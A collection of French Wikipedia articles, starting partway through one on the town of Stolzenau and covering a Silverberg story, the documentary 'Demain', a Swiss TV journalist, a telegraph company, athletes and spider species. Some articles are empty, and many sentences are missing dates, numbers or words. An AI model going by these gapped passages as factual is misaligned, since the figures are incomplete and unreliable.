Stolzenau apparaît dans les sources historiques le . Ce toponyme signifie « fière rivière » ("Stolze Aue") et il prend les formes écrites "Stoltenouwe, Stoltenow, Stotzenow, Stoltzenaw" et "Stoltzenawe". Le château est l'une des résidences saisonnières des comtes de Hoya. À la mort du comte Frédéric en 1503, le comté de Hoya devient vassal des ducs de Brunswick-Lunebourg. Jusqu'à la mort du dernier comte de Hoya, Othon VIII en 1582, elle demeure la terre d'élection des aristocrates de la maison de Hoya, puis est annexée au duché de Brunswick-Lunebourg.
En 1594, 85 maisons du village sont détruites par un incendie.
Au cours de la guerre de Trente Ans, les lansquenets du comte de Tilly s'emparent de Stolzenau le . Le , la ville est rendue aux Danois ; puis elle est sans cesse assiégée et pillée par les belligérants des deux camps. De graves épidémies, comme la « peste sanglante » ("Blutpest") de 1624, ou une dermatose purulente déciment la population.
Au moment de la Paix de Westphalie, le bailliage de Stolzenau et le village sont en ruines. Il souffre nettement moins des affres de la guerre de Sept Ans, et est simplement occupé par les Français.
La ville ne reprend son expansion qu'après 1815 : son église est construite en 1828, l'hôtel de ville de 1885, et elle devient chef-lieu du nouvel arrondissement de Stolzenau en 1884. Le château héberge les services administratifs, puis devient un camp de travaux forcés. On y aménage des logements en urgence en 1945, et il est rasé en 1965 pour construire l'école professionnelle.
En 1907, le service des pompiers de Stolzenau est institué sur proposition du conseiller régional Hugh Wilhelm Bergmann (en exercice de 1902 à 1917) et du bourgmestre W. Schröder. Malgré un fort développement immobilier depuis 1950, le centre ville conserve son caractère médiéval.
Am , Stolzenau fusionne avec les communes membres de l'agglomération de Landesbergen, pour former l'agglomération de "Mittelweser".
Culture et tourisme.
Entreprises.
L'activité économique de Stolzenau est dominée par l'agriculture, l'industrie de transformation et les gravières. C'est dans cette ville que s'est établie la plus grande mégisserie d'Allemagne ("Hornschuch Stolzenau", anciennement "Era"). Elle fournit des constructeurs automobiles comme VW ou Opel.
Infrastructures de transport.
La Weser est une voie navigable internationale qui relie Stolzenau au pont-canal de Minden, notamment.
La gare la plus proche est celle de "Leese-Stolzenau" sur la ligne Nienburg–Minden "(Weser-Aller-Bahn)", à à l'est du centre-ville.

</doc>
<doc id="9626131" url="https://fr.wikipedia.org/wiki?curid=9626131" title="Les Colporteurs de souffrance">
Les Colporteurs de souffrance

' (titre original : ') est une nouvelle de science-fiction de Robert Silverberg.
La nouvelle est connue pour dénoncer, bien avant sa création, la téléréalité et la cupidité de producteurs prêts à tout pour faire de l'audience, en employant les moyens les plus vils.
Publications.
Entre 1957 et 2017, la nouvelle a été éditée à une trentaine de reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
La nouvelle fut rédigée en novembre 1962 mais n'est parue qu'en sous le titre "" dans le magazine ] .
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
La nouvelle est publiée en France :
La nouvelle paraît en Italie :
La nouvelle a été publiée en Grande-Bretagne dans l'anthologie " (1991).
La nouvelle paraît aux Pays-Bas :
La nouvelle paraît en Allemagne :
La nouvelle paraît en Croatie en 1985 sous le titre "Prijenosnici bola".
Résumé.
Maurillo et Northrop travaillent pour une entreprise de télé poubelle : quand un accident a lieu et qu'un blessé grave doit être opéré, ou alors en cas de stade terminal d'une maladie, on fait signer à la famille une renonciation au droit à l'image du blessé. Puis on filme l'opération, ainsi que la douleur éprouvée par le blessé grâce à une sonde cérébrale. Le tout sera diffusé ultérieurement dans des cinémas spécialisés : les spectateurs verront les souffrances du blessé, mais aussi les ressentiront grâce à des capteurs placés sur leur corps. De la vraie télé-réalité ! 
Le récit commence lorsqu'on appelle Maurillo et son patron, Northrop, au sujet d'un homme ayant la gangrène à sa jambe. On va l'opérer, et Northrop propose à la famille la cession des droits pour une forte somme, à condition que le patient ne soit pas anesthésié. S'il réchappe à l'intervention chirurgicale, la chaîne de télévision paiera aussi les frais de convalescence. La famille, en pleur, signe le contrat proposé. L'opération a lieu, sans anesthésie, et l'on enregistre le tout : les images, les sons, les souffrances intolérables de l’homme. Northrop visionne le film et se déclare très satisfait, d'autant plus que le blessé n'a pas survécu à l'opération, si bien que la chaîne ne devra payer aucuns frais supplémentaires.
Quelques jours après, Northrop souhaite « se débarrasser » de Maurillo, qu'il ne trouve pas assez compétent, et propose de le faire transférer aux éditions pour la jeunesse. Furieux et se sentant humilié, Maurillo donne sa démission. Le lendemain, Northrop reçoit la visite d'Harry Gardner, le fils du défunt dont l'agonie avait été filmée, qui lui reproche l'absence d'anesthésie. Northrop rétorque que tous les membres de la famille, y compris Harry, ont signé le contrat de cession des droits, incluant l'absence d'anesthésie. Harry Gardner tire sur lui avec un révolver et blesse grièvement Northrop. Arrive Maurillo, venu au studio récupérer ses affaires : il embarque Northrop et l'emmène vers les studios de la société Transcontinental. Eux-aussi lancent une opération de trash-TV, à l'exception près qu'on ne paie ni les blessés ni les héritiers ! Northrop va donc, bien malgré lui, participer à une intervention chirurgicale du même type qu'il organisait il y a peu.
La nouvelle se termine ainsi : « Il survécut une heure. Tout le temps voulu pour capturer les affres de son agonie. Sa dernière pensée consciente ? Que c'était une sacrée déveine de ne pas tenir la vedette de sa propre émission. ».

</doc>
<doc id="9626133" url="https://fr.wikipedia.org/wiki?curid=9626133" title="Tusukuru tamburinus">
Tusukuru tamburinus

Tusukuru tamburinus est une espèce d'araignées aranéomorphes de la famille des Linyphiidae.
Distribution.
Cette espèce est endémique de Sibérie en Russie. Elle se rencontre dans les îles Kouriles et en Primorie.
Description.
Les mâles mesurent de à et les femelles de à .

</doc>
<doc id="9626138" url="https://fr.wikipedia.org/wiki?curid=9626138" title="Ian Peel">
Ian Peel

Ian Peel, né le 18 janvier 1958 à Skipton-on-Swale, est un tireur sportif britannique. 
Palmarès.
Le tableau présente le Palmarès d’Ian Peel

</doc>
<doc id="9626145" url="https://fr.wikipedia.org/wiki?curid=9626145" title="Aleksandr Puštov">
Aleksandr Puštov

Aleksandr Puštov, né le à Kaliningrad en Russie, est un footballeur international estonien, devenu entraîneur à l'issue de sa carrière, qui évoluait au poste d'attaquant.
Biographie.
Carrière internationale.
Aleksandr Puštov compte dix sélections et un but avec l'équipe d'Estonie entre 1992 et 1993. 
Il est convoqué pour la première fois par le sélectionneur national Uno Piir pour un match amical contre la Slovénie le , où il marque son seul but en sélection durant cette rencontre (1-1). Il reçoit sa dernière sélection le contre le Portugal (défaite 3-0).

</doc>
<doc id="9626149" url="https://fr.wikipedia.org/wiki?curid=9626149" title="Année de la Miséricorde">
Année de la Miséricorde



</doc>
<doc id="9626163" url="https://fr.wikipedia.org/wiki?curid=9626163" title="Daniel Sanchez (billard)">
Daniel Sanchez (billard)



</doc>
<doc id="9626165" url="https://fr.wikipedia.org/wiki?curid=9626165" title="Isolation (film)">
Isolation (film)



</doc>
<doc id="9626167" url="https://fr.wikipedia.org/wiki?curid=9626167" title="Demain (film, 2015)">
Demain (film, 2015)

Demain est un documentaire français réalisé par Cyril Dion et Mélanie Laurent, sorti en 2015. Devant un futur que les scientifiques annoncent préoccupant, le film a la particularité de ne pas donner dans le catastrophisme. Adoptant un point de vue optimiste, il recense des initiatives dans dix pays, face aux défis environnementaux et sociaux du , qu'il s'agisse d'agriculture, d'énergie, d'économie, d'éducation ou de gouvernance. 
Fait rare pour un documentaire, il dépasse le million d'entrées en France. Il remporte en 2016 le César du meilleur film documentaire.
Synopsis.
En 2012, dans la revue "Nature", Anthony Barnosky, Elizabeth Hadly et scientifiques annoncent qu'une partie de l'humanité pourrait disparaître avant 2100, du fait de l'impact de l'espèce humaine sur les écosystèmes, entraînant la fin des conditions de vie stables sur Terre. La surpopulation, le manque d'eau, le manque d'énergies fossiles, le réchauffement climatique vont lancer des millions de pauvres désespérés à l'assaut des pays nantis.
Mais le film ne s'attarde pas sur ce constat. L'essentiel du film est un road movie qui fait découvrir, en cinq volets thématiques, des exemples de réponses concrètes face aux problèmes environnementaux et sociaux du début du . L'équipe du film se rend dans dix pays, à la rencontre de citoyens qui mettent en œuvre des initiatives : en France métropolitaine et à La Réunion, en Finlande, au Danemark, en Belgique, en Inde du Sud, en Grande-Bretagne, aux États-Unis, en Suisse, en Suède et en Islande. Ils agissent à l'échelle de leur commune (en impliquant si possible les élus) ou à l'échelle de leur entreprise. Chaque groupe fait preuve de créativité, de débrouillardise et de solidarité.
Agriculture.
Détroit, ville des États-Unis dont l'activité reposait tout entière sur l'industrie, est passée de en 1950 à en 2010. Parmi la population défavorisée restée dans la ville beaucoup se sont organisés de façon autonome pour que leur nourriture ne dépende plus du transport, c'est-à-dire du pétrole. Ils produisent leurs légumes sur place, en ville. Détroit, qui compte , est devenue la ville du "Do it yourself" et de la consommation collaborative.
En Normandie, Perrine et Charles Hervé-Gruyer, agriculteurs bio, pratiquent une sorte de permaculture, qu'ils nomment écoculture, dans leur ferme du Bec-Hellouin. Ils produisent diversifié ( sur un hectare), sans pétrole. La terre, chargée d'humus, est plus fertile. En permettant à la nature de se régénérer, les Hervé-Gruyer réussissent à multiplier leur rendement par dix. Dans cette petite exploitation, l'agroécologie se révèle plus rentable que la monoculture, qui appauvrit la terre et reste tributaire du pétrole, des engrais et des pesticides. Sur notre planète, 75 % de la nourriture est produite par des petites fermes de quelques hectares. Selon Olivier De Schutter, le recours à l'agroécologie permettrait de doubler les rendements agricoles dans les dix ans.
En Angleterre, les habitants de Todmorden sèment des légumes et plantent des arbres fruitiers dans les rues, et tout le monde peut venir se servir. Réunis dans le mouvement Les Incroyables Comestibles, ils tentent d'atteindre l'autosuffisance alimentaire pour 2018. Dans le Devon, à la ferme de , , associé à d'autres fermiers bio de tout le pays, supervise la livraison de par semaine, livrés dans les aux particuliers.
Il est donc possible pour des citadins de produire leur nourriture. Il est possible aux campagnes de se repeupler. Cela pourrait même se pratiquer à grande échelle, si l'industrie pétrochimique, qui est liée au secteur agro-alimentaire, n'y faisait obstacle.
Énergie.
Dans le domaine énergétique, le film fait découvrir des bâtiments aux toits couverts de panneaux solaires, des alignements d'éoliennes, une réutilisation des déchets comme compost (à San Francisco) ou pour produire de l'électricité (à Copenhague) : des villes, voire des pays, anticipent la fin des énergies fossiles et du nucléaire. Les énergies renouvelables (notamment la géothermie) ne sont pas loin de donner à l'Islande son autonomie énergétique. En Inde du Sud, le village modèle de Kuthambakkam, construit avec des matériaux locaux écologiques, assure presque, lui aussi, son autonomie énergétique grâce aux énergies renouvelables.
Il reste que la transition énergétique est coûteuse. S'il faut être prêt à encaisser les changements climatiques, il faut aussi veiller à faire des économies. Les bâtiments publics de Copenhague ont déjà réduit de 45% leur consommation en énergie. La ville bénéficie d'un urbanisme modèle. Les habitants vivent à moins de d'un espace vert, et ils sont 50 % à se déplacer à vélo. L'objectif est de ne plus émettre de en 2025. Les habitants de Copenhague sont les plus grands consommateurs d'aliments bio au monde. Leur système de gestion des déchets est un des plus performants au monde.
Économie.
Quand une ville britannique émet sa propre monnaie à l'effigie de David Bowie, cette monnaie n'a aucune valeur ailleurs. L'argent gagné va donc être dépensé localement. Il n'ira pas dans la poche de multinationales préférant placer leur argent dans des paradis fiscaux plutôt que d'investir dans cette ville.
Le système de la monnaie complémentaire fait ses preuves en Suisse. La banque Wir y émet depuis 1934 le franc Wir, monnaie interentreprises qui ne peut être dépensée que dans les adhérentes. En Suisse, une PME sur cinq utilise le wir. Il permet, lorsqu'une crise paralyse le système bancaire, de trouver les financements nécessaires.
Mais comment combattre l'inégalité, que renforce chaque jour la mondialisation, entre les richissimes entreprises (qui détruisent la nature, épuisent les ressources) et les petites qui se débattent pour survivre ? Les petites entreprises doivent penser « local » et s'organiser en réseau. C'est ce qu'explique la localiste américaine Michelle Long, dirigeante du Balle (Business Alliance for Local Living Economies), un réseau de locaux.
La ville de San Francisco () pratique l'économie circulaire en recyclant 80 % de ses déchets et en visant le « zéro déchet » d'ici à 2020.
Dans les domaines de l'agriculture, de l'énergie, de l'habitat, de l'économie, des solutions abouties prouvent qu'elles fonctionnent. Pourquoi, se demandent les cinéastes, les gouvernements ne les mettent-ils pas en œuvre à plus grande échelle ?
Démocratie.
Les citoyens n'attendent plus des hommes politiques qu'ils répondent à leurs attentes. Comme le dit dans le film Olivier De Schutter, rapporteur spécial des Nations unies, la démocratie a disparu : les hommes politiques n'écoutent plus les citoyens, ils se contentent de répondre aux vœux des entreprises, qui veulent toujours plus d'une croissance aberrante.
L'équipe du film découvre que, dans certains pays, des mécanismes de démocratie directe sont mis en place par les citoyens. Ceux-ci peuvent dès lors proposer des lois, s'y opposer, écrire la constitution ou la modifier. Elle montre comment la démocratie locale a pu transformer la petite ville de Kuthambakkam, en Inde du Sud, expérience tirée du livre "Un million de révolutions tranquilles" de Bénédicte Manier (cité au générique du film).
La petite équipe de cinéastes se demande alors si les humains sont prêts à combattre leur avidité naturelle, à se montrer solidaires, coopératifs. Ne doivent-ils pas être sensibilisés à ces valeurs dès leur plus jeune âge ?
Éducation.
La Finlande est présentée comme un modèle en matière d'éducation. Cyril Dion décrit l'enseignement à la Kirkkojärvi Comprehensive School d'Espoo comme . Les enseignants aiment leur métier, ne distribuent ni notes ni sanctions, prennent leurs repas avec les élèves, ont recours à plusieurs pédagogies plutôt qu'à une seule, tiennent compte de la personnalité et des dispositions de chaque élève, dans des classes de moins de 15 enfants. Là, on recherche l'épanouissement de l'enfant plus que la transmission du savoir. On apprend à vivre en harmonie avec les autres, à coopérer et à négocier. On apprend aussi à se servir de ses mains. Les résultats mesurés sur des critères « scolaires » sont meilleurs : en 2009, le système éducatif finlandais (qui ne suit cependant pas tout à fait le même modèle que cette école) est classé deuxième mondial en sciences, troisième en lecture et sixième en mathématiques, . Mais surtout, ces enfants respectés, autorisés à exprimer leurs émotions sont formés .
Intervenants.
Les personnes intervenant à l'écran sont dans leur propre rôle.
Production.
Pour compléter le financement du tournage et de la location du matériel, l'équipe a besoin de . Le 2014, une opération de financement participatif est lancée sur KissKissBankBank. Le , ont permis de réunir , ce qui représente « plus d'un quart du budget du film ».
Accueil.
Critique.
Le film reçoit un accueil critique assez positif de la part de la presse (3,8 sur 5 sur le site Allociné). Il fait l'objet de critiques globalement bonnes dans les médias généralistes et d'un certain nombre de critiques mitigées dans des parutions plus militantes.
Box-office.
Le film reçoit un excellent accueil des spectateurs (4,6 sur 5 sur le site Allociné). Le premier jour, le démarrage est difficile : le cinéma test, à Paris, n'accueille que neuf spectateurs. Mais le film marche très bien durant le week-end, et finit sa première semaine avec , ce qui est un bon score pour un documentaire. Il reste dans le . Le , après d'exploitation, il réalise . Le , l'équipe du film annonce que le cap du million de spectateurs a été franchi. Après d'exploitation en salles (le record tous films confondus pour 2015), le film totalise en France et se classe au box-office de 2015.
Analyse.
Contrairement à d'autres documentaires qui se concentrent plutôt sur l'origine des déséquilibres environnementaux planétaires et leurs conséquences négatives (tels que "Le Syndrome du Titanic", "La Onzième Heure, le dernier virage", "Une vérité qui dérange", "Nos enfants nous accuseront" et "Home"), "Demain" propose une approche constructive (comparable à "Solutions locales pour un désordre global") mettant en avant des solutions aux problèmes écologiques menaçant l’humanité. Au passage, le film dénonce les lobbies conservateurs agissant pour maintenir le "statu quo", acquérant une dimension .
"Demain" est l'œuvre de militants plutôt que de cinéastes, défendant des thèses sans émettre de critiques. Ce film et "Merci Patron !" remportent tous deux un succès inattendu au début de l'année 2016, participant au même mouvement que Nuit debout en donnant la parole aux anonymes pour inciter les citoyens à s'engager pour la collectivité.
Les cinq chapitres du film (alimentation, énergie, économie, démocratie et éducation) sont liés par un « fil narratif » dans le but d'en faire un récit décrivant ce que le monde de demain pourrait être. Les réalisateurs ont été inspirés par l'essai "L'Espèce fabulatrice" de Nancy Huston qui « insiste sur la propension des humains à penser en termes de fiction, de récit, de narration ».
Le groupe d'humoristes du "Palmashow" a réalisé une parodie du film, intitulée "Après-Demain", dans laquelle ils tournent en dérision l'auto-mise en scène de Cyril Dion et Mélanie Laurent, ainsi que le décalage énorme entre les enjeux écologiques terrestres et les proposées. 
Lors de la sortie de ce film, le système scolaire finlandais avait été rétrogradé à la en 2012. Par ailleurs, la "Kirkkojärvi Comprehensive School" finlandaise dans laquelle est tournée la séquence dédiée à l'éducation est une école privée pratiquant la pédagogie Steiner-Waldorf, théorie pédagogique controversée : celle-ci n'est donc pas représentative du système scolaire finlandais ni liée aux résultats de celui-ci.
Postérité et impact.
Le film est projeté dans plusieurs cercles internationaux (COP 21, Parlement européen, ONU…). Plus de 700 projets liés aux initiatives décrites dans le film ont été lancés fin 2016. Le film a été diffusé à chaque école de Bruxelles par la Ministre bruxelloise de l'Environnement.
En octobre 2016, Mélanie Laurent et Cyril Dion reçoivent tous les deux le titre de Docteur Honoris Causa de l'université de Namur (Belgique) pour ce documentaire.
Le film suscite un engouement pour des formes alternatives de consommation et de participation à la société qu'il présente, ce qui pousse Cyril Dion et le mouvement Colibris à organiser des événements dans les années qui suivent pour diffuser les initiatives et favoriser l'élargissement du mouvement à la sphère politique, notamment à l'occasion de l'élection présidentielle française de 2017.
La ville de Vandœuvre-lès-Nancy, seconde ville de Meurthe-et-Moselle par son nombre d'habitants, organise en 2017 en partenariat avec le mouvement Colibris 54 et d'autres acteurs locaux une série d'événements structurés autour des thèmes du film intitulés "Ici c'est aussi demain". La mairie déclare avoir « envie de poursuivre le voyage avec la population de la commune et de l’agglomération ».
Le film donne l'idée à quatre genevois de mettre en valeur les initiatives locales en réalisant en 2018 le film "Demain Genève".
En 2018, Cyril Dion et Laure Noualhat sortent un documentaire d'une durée d' intitulé "Après demain", qui fait un point sur les projets initiés par le film "Demain" en étant relayés par des collectivités territoriales françaises et des entrepreneurs. 

</doc>
<doc id="9626168" url="https://fr.wikipedia.org/wiki?curid=9626168" title="Christian Defaye">
Christian Defaye

Christian Defaye, né Christian Large le à Villefranche-sur-Saône et mort le à Genève, est un journaliste franco-suisse de télévision, animateur durant 23 ans de l'émission hebdomadaire "Spécial cinéma" puis de l’émission "Tout va bien" sur la TSR.
Biographie.
Jeunesse et formation.
Né le à Villefranche-sur-Saône, Christian Large s’installe à Lyon avec sa mère en 1939, passe toute la guerre, dans un internat religieux, jusqu’à son baccalauréat, puis une licence en Sciences-Politique, à Paris. Remarqué avec Philippe Labro et Pierre Bouteiller lors d’un concours lancé par Europe 1, en 1956, à 22 ans, Maurice Siegel lui confie la rubrique météo d'Europe 1, jusqu'en 1959 où il devient reporter dans la presse écrite au "Progrès de Lyon" et couvre l’enquête sur l’affaire Deveaux, avec l’écrivain Bernard Clavel, Frédéric Pottecher et Daniel Sarne, publiée chez Denoël dans la collection de Jacques Lanzmann. En 1963, il y fonde le mouvement des journalistes internationaux et entre au journal "Le Matin" ("Tribune de Lausanne)" puis enquête sur "Les nazis parmi nous", réalisée en 1967, avec Max Syfrig. Il écrit pour "La Suisse" sur la gastronomie pour "Plaisir Gastronomie Magazine".
Journaliste de télévision.
En 1968, il entre à la Télévision suisse romande, il commence sa carrière au sein de la rubrique d’actualité "Carrefour", confiné à la cabine de commentaire des sujets d’actualités régionales présentés par les vedettes de l’époque. Il partage le bureau d’Eric Lehmann, qui deviendra plus tard président de la SSR. 
Christian Defaye et Eric Lehmann sont choisis pour la présenter. "Le top départ est donné" pour une série de reportages émissions réalisés avec diverses équipes de la TSR. Avec son ami Jean Claude Chanel, ils conçoivent l’émission réalisée au pénitencier de Bochuz avec Johnny Hallyday auquel s’est joint Raymond Devos.
En avril 1972, il lance avec Eric Lehmann "Bon dimanche Mr X", une émission allant à la rencontre du public afin de découvrir des personnalités romandes et leurs histoires. En 1974, avec Christian Zender et Christiane Cusin, ils lancent une émission pirate, "Spécial cinéma". Sans aucun moyen, cette émission va occuper l’espace du lundi dès 1974 et s’imposer rapidement parmi les programmes les plus populaires de la Télévision Suisse Romande. 
Avec plus de 950 émissions présentées et invités reçus, Christian Defaye est l'un des journalistes/producteurs ayant l'une des carrières les plus riches du paysage audio-visuel suisse. Claudette Defaye-Cottagnoud le rejoint dès 1975 pour tout ce qui concerne l’actualité et la bibliographie du cinéma au sein de la rubrique "Cinerama". Ils formeront un couple à la ville comme à la télévision, jusqu'au décès de Christian Defaye, en 1997. Elle poursuivra la présentation de la rubrique d'actualité cinématographique de la Télévision suisse romande dans l'émission, qui fut rebaptisée "Vive le cinéma", et ce jusqu'en mars 2004.
Directeur de chaîne de télévision.
Un premier mandat est demandé à Christian Defaye en 1990 pour l'amélioration qualitative des productions de Télécinéromandie, une chaîne télévisée à péage spécialisée dans la diffusion de contenu lié au cinéma.
En 1991, les investisseurs lui demandent de reprendre la direction générale de Télécinéromandie avec comme but de lui insuffler une nouvelle vie. Cependant, la santé financière chancelante de la chaîne ne lui offre pas l'opportunité de la faire revivre. En juin 1991, il doit se résoudre à abandonner. En parallèle, il poursuivra sa carrière de producteur et présentateur pour la TSR.
Animateur de télévision.
De 1991 à 1997, il poursuivra la présentation de l'émission "Spécial cinéma" jusqu'à ce que la maladie ne l'écarte définitivement de l'antenne le .
En 1992, il commente la des Césars pour la TSR et . En parallèle, il lance en septembre 1993 une nouvelle émission d'interview et débats intitulée "Tout va bien" où il reçoit de nombreux invités durant les quatre années de diffusion, dont notamment la conseillère Fédérale déchue Elisabeth Kopp, Nicolas Hayek, Roger Pfund, Henri Dès, ou encore Frédy Girardet.
De 1986 à 1988, il anime avec le cinéaste Simon Edestein et le producteur Claude Richardet des stages d’entreprises à l'expression télévisuelle pour de grandes entreprises suisses.
Vie privée.
Il se marie une première fois en 1964 avec Heidy Stauffer, à Pully. Ils divorcent deux ans plus tard. En 1972, dans les studios de la télévision, il rencontre la speakerine Claudette Cottagnoud, qui deviendra sa femme.
Décès.
Il disparaît le 23 juillet 1997, emporté par la maladie à son domicile genevois. Alain Delon lui rendra hommage en l'évoquant comme cela : 

</doc>
<doc id="9626169" url="https://fr.wikipedia.org/wiki?curid=9626169" title="Indo-European Telegraph Company">
Indo-European Telegraph Company

L’Indo-European Telegraph Company était une des plus importantes sociétés de télégraphie des années 1860, chargée d'établir un lien entre Londres et Bombay.
Histoire.
L'Indo-European Telegraph Company était chargée de finaliser un grand projet télégraphique, associant l'Orient à l'Europeː elle doit prolonger le projet de câble de Reuters reliant Lowestoft à l'île allemande de Norderney puis Hanovre et Hambourg et qui affiche une rentabilité de 19 % dès 1868. Via l'Iran, il doit relier Bombay à Londres. La société est très bien valorisée à son entrée en Bourse, avec sterling. Elle promet à ses actionnaires un bénéfice de 85000 sterling par an, grâce à un trafic de 200 messages par jour et un dividende 20 %. Les frères Siemens détiennent 20̥ pour cent de l'entreprise, via les banques Rothschild, Schaafhausen and Mevissen et Paul-Julius Reuters est également dans l'aventure. Environ 80 % du capital est placé en Angleterre.
Le président de l'"Indo", fondée en , était Robert Grimston et son directeur général Henry Weaver, ex-président de l'Electric and International Telegraph Company. Le câble est entièrement posé à la fin de l'année 1870.

</doc>
<doc id="9626176" url="https://fr.wikipedia.org/wiki?curid=9626176" title="Pierre Guillaume de la Vieuxville (mort en 1734)">
Pierre Guillaume de la Vieuxville (mort en 1734)



</doc>
<doc id="9626177" url="https://fr.wikipedia.org/wiki?curid=9626177" title="Jean Marty (joueur de billard)">
Jean Marty (joueur de billard)

Jean Marty, né le à Perpignan (Pyrénées-Orientales) et mort le à Paris, est un joueur français de billard français, spécialisé dans les jeux de série.
Il est inhumé au Cimetière des Batignolles à Paris.
Anecdotes.
1) Un jour, Jean faisait du vélo avec des amis dans la campagne. Morts de soif, ils s’arrêtent dans un café où il y avait un billard. Le propriétaire dit à Jean qu'il avait été un champion. Marty lui propose une partie et lui dit « Combien faites-vous de moyenne ? ». L'homme lui dit fièrement 3 environ. Marty lui dit de commencer. Marty, les yeux pétillants, était très intéressé par les 4 points que son adversaire fit pour sa première reprise. Marty s’approcha du billard et lui dit « Grand jour pour vous ! Vous venez de faire 4 de moyenne ! ».
2) Dans les années 60, Jean Marty dans un championnat de France, après avoir gagné le toss, a laissé son adversaire commencer la 1ère partie et c'est ainsi qu'il a pris 500 à 0. Pour les autres rencontres, Jean Marty, blessé de ce déroulement défavorable, a gagné tous les toss et a toujours commencé. Du coup, il a gagné toutes ses parties en 500 points en 1 reprise ! (Sauf une en 2 reprises)
3) Installé à Pordic, le fils de Jean Marty rêve d’ouvrir un musée sur l’histoire du billard basé sur sa collection constituée de plus de 450 gravures, 250 queues, six billards de marques historiques, des assiettes, des catalogues de grands fabricants.
Voir aussi.
Liens externes.
__FORCERSOMMAIRE__

</doc>
<doc id="9626181" url="https://fr.wikipedia.org/wiki?curid=9626181" title="Dōbutsu Sentai Jyuohger">
Dōbutsu Sentai Jyuohger



</doc>
<doc id="9626183" url="https://fr.wikipedia.org/wiki?curid=9626183" title="Pierre Guillaume de la Vieuxville (mort en 1727)">
Pierre Guillaume de la Vieuxville (mort en 1727)



</doc>
<doc id="9626188" url="https://fr.wikipedia.org/wiki?curid=9626188" title="Into the Labyrinth (album de Saxon)">
Into the Labyrinth (album de Saxon)

 est le studio du groupe de heavy metal anglais Saxon, sorti le .
Liste des morceaux.
Musiques de Biff Byford, Doug Scarratt, Paul Quinn, Nigel Glockler, Timothy "Nibbs" Carter - Paroles de Biff Byford

</doc>
<doc id="9626199" url="https://fr.wikipedia.org/wiki?curid=9626199" title="Josef Christiaens">
Josef Christiaens

Josef Christiaens, né le à Saint-Josse-ten-Noode et décédé le à Wolverhampton (West Midlands), est un ancien pilote automobile belge de monoplaces devenu aviateur, ingénieur de formation.
Biographie.
En course automobile, il débute à la mi-août 1905 lors de la "Coupe de Liedekerke et Williame" de Dinant.
Nicolas Caërels et ont notamment été ses mécaniciens embarqués, chez Excelsior.
Il devient le premier étranger à participer au Indianapolis Motor Speedway "Harvest Classic" en , avec sa Sunbeam 2.3L. (une série de trois courses, sur 20, 50 et 100 milles).
Après avoir vu voler Henri Farman sur Voisin fin mai 1908 lors d'un meeting à Gand, il décide de se lancer à son tour quelques mois plus tard dans le pilotage d'aéroplanes. Il rencontre à cette fin Jorge Chávez au Camp de Châlons en , qui lui prête son Farman pour son instruction, et il obtient sa licence en France le sous le numéro 7. Il est l'un des onze premiers pilotes enregistrés à l'Aéro-Club de Belgique, ainsi que le premier homme à avoir survolé Singapour, en (sur Bristol Boxkite). Il participe aussi au meeting aérien de Cannes en mars 1910, remportant le prix du tour de piste (1 min 41 s 2/5) et à la Grande Semaine d'aviation de Rouen en , puis moins d'un mois plus tard à la aéronautique de Champagne, toujours sur Farman à moteur Gnome (volant aussi comme passager d'Hubert Latham sur biplane Antoinette, à Reims).
Le premier conflit mondial achevé, il meurt dans un accident de la route en testant une Sunbeam près de Moorfield Works. Sa voiture percute un mur alors qu'il cherche à éviter le cheval d'une charrette en mouvement : son mécanicien Frank Bills reste handicapé à la suite du choc.

</doc>
<doc id="9626205" url="https://fr.wikipedia.org/wiki?curid=9626205" title="David Jiménez (journaliste)">
David Jiménez (journaliste)

David Jiménez (Barcelone, ) est un journaliste espagnol. Depuis est directeur du journal "El Mundo", en remplacement de Casimiro García-Abadillo.
Biographie.
Né à Barcelone, en 1971, il a une licence en Journalisme par l'Université de Barcelone. Il a commencé en travaillant en 1994 pour le quotidien "El Mundo", dans son édition de Madrid. Dès 1998, il a été nommé corresponsal de l'Asie et Proche-Orient, et a surtout couvert les conflits de l'Afghanistan, de Cachemire et du Timor oriental.
Trajectoire.
En 2014 il s'a amusé d'une bourse Nieman de l'Université d'Harvard que lui a permis travailler en la Moyenne Lab de l'Institut Technologique de Massachusetts (MIT) sur les défis digitaux de la presse.
À la fin d'avril de 2015 a été nommé directeur du journal "El Mundo", en remplacement de Casimiro García-Abadillo, qu'avait occupé la charge depuis Pedro J. Ramírez, le .

</doc>
<doc id="9626209" url="https://fr.wikipedia.org/wiki?curid=9626209" title="Dori Sakurada">
Dori Sakurada



</doc>
<doc id="9626212" url="https://fr.wikipedia.org/wiki?curid=9626212" title="Tutaibo debilipes">
Tutaibo debilipes

Tutaibo debilipes est une espèce d'araignées aranéomorphes de la famille des Linyphiidae.
Distribution.
Cette espèce est endémique de la région de Cuzco au Pérou.
Description.
Les mâles mesurent de à et les femelles de à .

</doc>
<doc id="9626213" url="https://fr.wikipedia.org/wiki?curid=9626213" title="L'Homme au complet gris">
L'Homme au complet gris

L'Homme au complet gris ("") est un film américain, réalisé par Nunnally Johnson, sorti en 1956.
Il ne doit pas être confondu avec "L'Homme au complet blanc", film de 1951, bien que les deux films comportent une certaine critique sociétale.
Synopsis.
Arrivant difficilement à joindre les deux bouts, Tom Rath, employé newyorkais, postule à un poste plus lucratif et à plus hautes responsabilités dans les relations publiques. Cependant, ce nouveau travail risque de l'éloigner de sa famille et de briser son couple, déjà fragilisé, comme ce fut le cas pour son nouveau patron, Ralph Hopkins, d'autant qu'il apprend l'existence d'un enfant illégitime qu'il a eu durant la guerre.
Récompenses et distinctions.
Le film a été présenté en sélection officielle en compétition au Festival de Cannes 1956.

</doc>
<doc id="9626218" url="https://fr.wikipedia.org/wiki?curid=9626218" title="Ski alpin aux Deaflympics">
Ski alpin aux Deaflympics

Le ski alpin fait son apparition aux Deaflympics d'hiver de 1949 à Seefeld in Tirol (Suisse). 
Skieurs les plus titrés.
Les skieurs ayant remporté au moins deux titres Deaflympics :
Les skieuses ayant remporté au moins deux titres Deaflympics :

</doc>
<doc id="9626221" url="https://fr.wikipedia.org/wiki?curid=9626221" title="Blue Earth">
Blue Earth

 peut désigner :

</doc>
<doc id="9626234" url="https://fr.wikipedia.org/wiki?curid=9626234" title="Skipton-on-Swale">
Skipton-on-Swale

Skipton-on-Swale est un village du Yorkshire du Nord, en Angleterre. Il est situé sur la rivière Swale.

</doc>
<doc id="9626240" url="https://fr.wikipedia.org/wiki?curid=9626240" title="Derby de Liège">
Derby de Liège

